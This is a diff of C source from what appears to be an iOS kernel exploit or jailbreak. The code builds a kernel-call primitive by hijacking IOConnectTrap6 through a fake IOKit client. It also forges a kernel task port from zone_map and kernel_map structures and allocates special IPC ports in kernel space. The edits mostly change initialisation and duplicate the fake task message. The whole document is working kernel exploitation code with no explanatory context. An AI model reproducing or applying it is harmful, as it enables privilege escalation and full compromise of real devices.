@@ -211,7 +211,6 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets,void * fake_client,u
 
 uint64_t kcall_raw(offsets_t * offsets,void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr, int n_args, ...)
 {
-	kern_return_t ret;
     if (n_args > 7)
     {
         LOG("no more than 7 args you cheeky fuck");
@@ -221,7 +220,8 @@ uint64_t kcall_raw(offsets_t * offsets,void * fake_client, uint64_t kslide,mach_
     va_list ap;
     va_start(ap, n_args);
 
-    uint64_t args[7] = { 0 };
+    uint64_t args[7];
+	for (int i = 0; i < 7; i++) {args[i] = 0;}
     for (int i = 0; i < n_args; i++)
     {
         args[i] = va_arg(ap, uint64_t);
@@ -236,12 +236,6 @@ uint64_t kcall_raw(offsets_t * offsets,void * fake_client, uint64_t kslide,mach_
 
     *(uint64_t *)(fake_client + 0x40) = args[0];
     *(uint64_t *)(fake_client + 0x48) = addr + kslide;
-
-    if (ret != KERN_SUCCESS)
-    {
-        LOG("failed to write to kdata buffer! ret: %x", ret);
-        return 0x0;
-    }
 
     return offsets->userland_funcs.IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
 }
@@ -315,7 +309,10 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
         kptr_t end;
     } kmap_hdr_t;
 
-    kmap_hdr_t zm_hdr = { 0 };
+    kmap_hdr_t zm_hdr;
+	for (int i = 0; i < sizeof(zm_hdr);i++) {
+		*((char*)(((uint64_t)&zm_hdr) + i)) = 0x0;
+	}
 
     // lck_rw_t = uintptr_t opaque[2] = unsigned long opaque[2]
     kreadbuf(zone_map_addr + (sizeof(unsigned long) * 2), (void *)&zm_hdr, sizeof(zm_hdr));
@@ -378,7 +375,9 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
     }
     LOG("ipc_space_kernel: %llx", ipc_space_kernel);
 
-    uint64_t ptrs[2] = { 0 };
+    uint64_t ptrs[2];
+	ptrs[0] = 0;
+	ptrs[1] = 0;
     ptrs[0] = zonemap_fix_addr(kcall(offsets->funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
     ptrs[1] = zonemap_fix_addr(kcall(offsets->funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
     LOG("zm_port addr: %llx", ptrs[0]);
@@ -392,7 +391,7 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
 		ret = KERN_FAILURE;
 		goto out;
 	}
-    mach_msg_data_buffer_t * zm_task_buf_msg = (mach_msg_data_buffer_t *)&scratch_space;
+    mach_msg_data_buffer_t * zm_task_buf_msg = (mach_msg_data_buffer_t *)&scratch_space[0];
     for (int i = 0; i < 4096; i++) {
 		scratch_space[i] = 0x0;
 	}
@@ -408,7 +407,13 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
     *(kptr_t *)((uint64_t)zm_task_buf + offsets->struct_offsets.task_itk_self) = 1;
     zm_task_buf->a.map = zone_map_addr;
 
-	mach_msg_data_buffer_t * km_task_buf_msg = (mach_msg_data_buffer_t *)(((uint64_t)&scratch_space) + 2048);
+	mach_msg_data_buffer_t * km_task_buf_msg = (mach_msg_data_buffer_t *)(((uint64_t)&scratch_space[0]) + 2048);
+	// duplicate the message
+	for (int i = 0; i < ktask_size; i++) {
+		scratch_space[i+2048] = scratch_space[i];
+	}
+
+	km_task_buf_msg->verification_key = 0x4343434344444444;
 	ktask_t *km_task_buf = (ktask_t *)(&km_task_buf_msg->data[0]);
     km_task_buf->a.map = kernel_vm_map;
 
